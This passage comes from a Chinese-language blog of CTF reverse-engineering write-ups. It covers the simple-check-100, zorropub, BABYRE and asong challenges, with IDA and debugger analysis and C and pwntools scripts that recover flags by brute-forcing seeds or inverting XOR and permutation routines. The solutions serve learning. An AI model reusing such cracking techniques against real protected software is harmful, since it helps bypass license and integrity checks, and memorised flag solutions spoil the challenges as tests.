class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506201841271-1592290342688.png" alt="image-20200506201841271"></p><p>根据我们打游戏的熟悉 aswd ,朝着1走到最后.  <strong>ssddwdwdddsssaasasaaassddddwdds</strong> 最后在linux下输入.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200504140433640-1592290514404.png" alt="image-20200504140433640"></p><p><strong>总结: 更加熟悉了linux动态调试的运用,  加深了数组指针的理解.</strong></p><h3 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h3><p>题目本来很简单, 但是有坑啊…</p><p>首先, 题目下载下来, 有三个版本. 下意识的选择了熟悉的.exe来分析. </p><p>查壳无壳, 用ida打开. 第一直觉就是这个最后的flag与我们输入字符没关系, 直接OD动态调试跳过判断条件就好了.</p><p>还是先细看一下栈空间, 虽然还是和我们输入的字符没有关系. 但是有问题啊,要用的地址交叉了.  想着万一题就是这样呢, 先取OD试一下. 不出所料, 乱码😢 </p><p>开始仔细分析下这个题的栈空间, 在OD反复调试, 发现我们输入字符的空间只有19个字节啊, 为什么我们输入的字符栈空间在OD中调试有19+32 = 51字节空间.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506144401943-1592290592390.png" alt="image-20200506144401943"></p><p>看了半天不知道为什么, 后面才看见程序下面有  <strong>v3 = alloca(32);</strong> 百度了一下, 这个是再栈上申请空间的函数. 正好是多出来的32. </p><p>经过反复调试, 这个题怎么也和我们输入的字符没关系啊, 程序每次过了判断条件, 算的都一样. 真的奇怪了.</p><p>最后没办法了,想不通.  就最后再把文件中这个程序的linux版本载入ida看看,  嗯….这个版本的栈空间就没有交叉. v7一直到v34, 没有像PE文件那个版本在中间多一个指针.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506145151730-1592290606770.png" alt="image-20200506145151730"></p><p>在linux下动态调试.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506145627945-1592290617965.png" alt="image-20200506145627945"></p><p>😂什么鬼题. PE文件版本居然是有问题的!!!</p><p><strong>总结: 文件有多个版本的时候, 注意!!! 张见识了. 虽然多花了时间在PE上耗, 但是对栈更清楚了.</strong></p><hr><h3 id="zorropub"><a href="#zorropub" class="headerlink" title="zorropub"></a>zorropub</h3><p>查壳查位数后载入ida, 整体思路如下.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200508104152981-1592290667231.png" alt="image-20200508104152981"></p><p>那其实我们是不用管这个 MD5 加密的 , 也不会这个解密.  直接爆破找到 <strong>i</strong> 值从而得到随机数种子.</p><p>那问题来了, 爆破找了一个 <strong>i</strong> 值是1023, 就在linux写了exp(<strong>不能在window下, 因为生成随机数不同</strong>). 但得到的数据都是乱码的, 我还是一直以为问题出现在 <strong>LOBYTE(取最低字节位)</strong> 因为第一次接触. </p><p>最后才想起那个 <strong>i</strong> 的值, 它可能不是唯一的. 开始写exp, 取大范围的数据爆破, 果然对了……</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">srand(a);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                b = rand()%<span class="number">1000</span>;</span><br><span class="line">                flag[i] = b^c[<span class="number">4</span>*i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag[i] &gt; <span class="number">126</span> || flag[i] &lt; <span class="number">32</span>)</span><br><span class="line">f = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!f)</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, b = <span class="number">0</span>, j = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000</span>] = &#123;</span><br><span class="line">  <span class="number">200</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">50</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">206</span>,   <span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">  <span class="number">184</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">126</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">136</span>,   <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">73</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">94</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">52</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">163</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">150</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">64</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">40</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">252</span>,   <span class="number">2</span>,</span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">142</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">   <span class="number">38</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">42</span>,   <span class="number">3</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">245</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">95</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">  <span class="number">104</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">235</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">121</span>,   <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">29</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">78</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = i;</span><br><span class="line"><span class="keyword">while</span>(j)</span><br><span class="line">&#123;</span><br><span class="line">cnt++;</span><br><span class="line">j &amp;= j<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt == <span class="number">10</span>)</span><br><span class="line">func(i,  a);</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200508105155224-1592290710459.png" alt="image-20200508105155224"></p><p>然后做完, 还是去看看大佬的writeup. 想看看那个md5怎解密, 但是没有.  却发现好多都是用的pwntools工具来爆破的, 自己也去试了下, 确实简单很多.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">a = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>, <span class="number">0xffff</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    j = i</span><br><span class="line">    <span class="keyword">while</span>(j):</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        j &amp;= j<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> cnt == <span class="number">10</span>:</span><br><span class="line">        a.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p = process(<span class="string">"./11"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">    ans = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"NULL"</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">print</span> (text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><p><strong>总结: (1)既然是爆破就要注意有多种情况 (2) LOBYTE 是ida的宏定义, 取最低字节位. (3)更加熟悉pwntools工具的使用.</strong></p><h3 id="BABYRE"><a href="#BABYRE" class="headerlink" title="BABYRE"></a>BABYRE</h3><p>题目不难, 但是第一次遇到这样的题.</p><p>64位elf文件, ida打开后, 和以往的文件不一样, 开始有一段循环计算赋值的操作,但是又是看不到到底是赋值给了谁.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200512134025680-1592290738761.png" alt="image-20200512134025680"></p><p>那就动态调试跟来看看, 到了判断条件的时候. 明白了就是类似加壳的程序打开会先进行解压生成代码. 这里开始那一段循环作用, 就改变我们代码的.</p><p>跟进判断函数, 算法很简单,直接读汇编,  就是一个异或操作然后对比. </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200512133918795-1592290773581.png" alt="image-20200512133918795"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7F</span>, <span class="number">0x6B</span>, <span class="number">0x37</span>, <span class="number">0x64</span>,  <span class="number">0x3B</span>, <span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x3B</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = a[i] ^ i; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结: 算是长见识吧.</strong></p><p>攻防世界刷题记录（4）。<!-- more --></p><h3 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h3><h4 id="0x1分析"><a href="#0x1分析" class="headerlink" title="0x1分析"></a>0x1分析</h4><p>下载下来三个文件。</p><p>依次看了下, 一个64位elf文件无壳, 2个文本文件.  打开文本文件后,没有头绪.  将elf文件载入ida。</p><p>整个流程开始看不清楚做什么, 多看几次明白了. 先输入字符串, 打开一个that_girl文件读信息, 最后向out文件写信息. 但这怎么和flag联系起来呢.  其实那个out文件里的就是密文, 我们找到逆向算法, 通过密文求出明文(即我们的输入, 也是flag) </p><p>下面具体分析每个函数. 第一函数: <strong>sub_400B4C</strong> 由于很简单, 直接给出函数功能.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515112040201-1591166378815.png" alt="image-20200515112040201"></p><p><strong>sub_400B4C</strong>: 先判断, 再取 { } 之间的内容.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515112333168-1591166382914.png" alt="image-20200515112333168"></p><p>下面下一个函数,  疑问：<strong>v4哪里来的及 ++*(_DWORD *)(4LL * v2 + v4);语句的作用</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515113837252-1591166387143.png" alt="image-20200515113837252"></p><p><strong>sub_400936(&amp;buf)</strong>:</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515170301682-1591166983676.png" alt="image-20200515170301682"></p><p>第一次遇到, 没有经验, 后来才想到通过汇编的查看, v4即是我们传了参数 a2(也就是主函数的v3), 这是通过寄存器传递. 64位与32位程序的区别. 但该语句功能还不是很清楚.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515114501031-1591166391168.png" alt="image-20200515114501031"></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515114755333-1591166411300.png" alt="image-20200515114755333"></p><p>继续看下一个函数<strong>sub_400E54</strong>:  看到这里, 就很清晰了,  就是先通过统计<strong>that_girl</strong>文件中每个字符出现的次数, 然后按照一定的顺序输入字符, 把每个字符出现的次数按一定顺序给下面的 v5 数组赋值.<strong>那所以sub_400936转换字符函数我们是不用管的.</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515115440782-1591166415194.png" alt="image-20200515115440782"></p><p>下面是2个加密函数,  我算法太菜, 逆算法想半天😅, 首先<strong>sub_400D33((unsigned __int8 *)v5);</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515120938171-1591166420082.png" alt="image-20200515120938171"></p><p>然后 <strong>sub_400DB4(v5, v4);</strong> 解释起来有点抽象……注意是一个字节, 所以多出的位要舍弃<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515125253662-1591166423427.png" alt="image-20200515125253662"></p><p>举个例子:</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515134001272-1591166447078.png" alt="image-20200515134001272"></p><p>最后一个函数: <strong>sub_400CC0((__int64)v5, “out”, v4);</strong>将加密后的值写入 out文件. </p><h4 id="0x2逆向解密"><a href="#0x2逆向解密" class="headerlink" title="0x2逆向解密"></a>0x2逆向解密</h4><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida[<span class="number">152</span>];</span><br><span class="line"><span class="keyword">int</span> change[<span class="number">38</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">22</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">24</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">21</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">17</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">23</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">14</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">19</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">11</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">25</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">36</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">33</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>, lenth = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, c[<span class="number">2000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> count[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;, change_[<span class="number">38</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">fp = fopen(<span class="string">"out"</span>, <span class="string">"rb"</span>);      <span class="comment">//先从文件读取密文  </span></span><br><span class="line">lenth = fread(b, <span class="number">1</span>, <span class="number">100</span>, fp); <span class="comment">//返回读取成功个数, 确定字符个数</span></span><br><span class="line">fclose(fp);</span><br><span class="line">    </span><br><span class="line">temp = b[lenth<span class="number">-1</span>]&amp;<span class="number">7</span>; <span class="comment">//&amp;7  取后三位数据.</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (b[i] &gt;&gt; <span class="number">3</span>) | (temp &lt;&lt; <span class="number">5</span>);</span><br><span class="line">temp = b[i]&amp;<span class="number">7</span>;<span class="comment">//从整体来看就是将整个数据右移动3位</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">fp = fopen(<span class="string">"that_girl"</span>, <span class="string">"rb"</span>); <span class="comment">//打开that_girl, 统计字符数.</span></span><br><span class="line">fread(c, <span class="number">1</span>, <span class="number">1742</span>, fp);</span><br><span class="line">fclose(fp); </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i] &gt;= <span class="number">65</span> &amp;&amp; c[i] &lt;= <span class="number">90</span>)  </span><br><span class="line">c[i] += <span class="number">32</span>;<span class="comment">//因为不区分大小写, 都转换为小写</span></span><br><span class="line"></span><br><span class="line">count[c[i]]++; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(A.change[i]) </span><br><span class="line">&#123;</span><br><span class="line">change_[j++] = A.change[i];  <span class="comment">//统计每个字符出现次数</span></span><br><span class="line">i = A.change[i];  </span><br><span class="line">&#125;</span><br><span class="line">j -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">temp = a[<span class="number">0</span>], a[<span class="number">0</span>] = a[change_[j]];  <span class="comment">//第二层解密</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth<span class="number">-2</span>; i++) <span class="comment">//按照给定赋值找到一个未变的值, 倒序赋值回去即可</span></span><br><span class="line">&#123;</span><br><span class="line">a[change_[j]] = a[change_[--j]];</span><br><span class="line">&#125;</span><br><span class="line">a[change_[j]] = temp; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)<span class="comment">//第三层解密,比对每个字符出现的次数的顺序,进而确定输入顺序</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == count[j])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j; </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"QCTF&#123;%s&#125;"</span>, flag); <span class="comment">//得到flag.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img 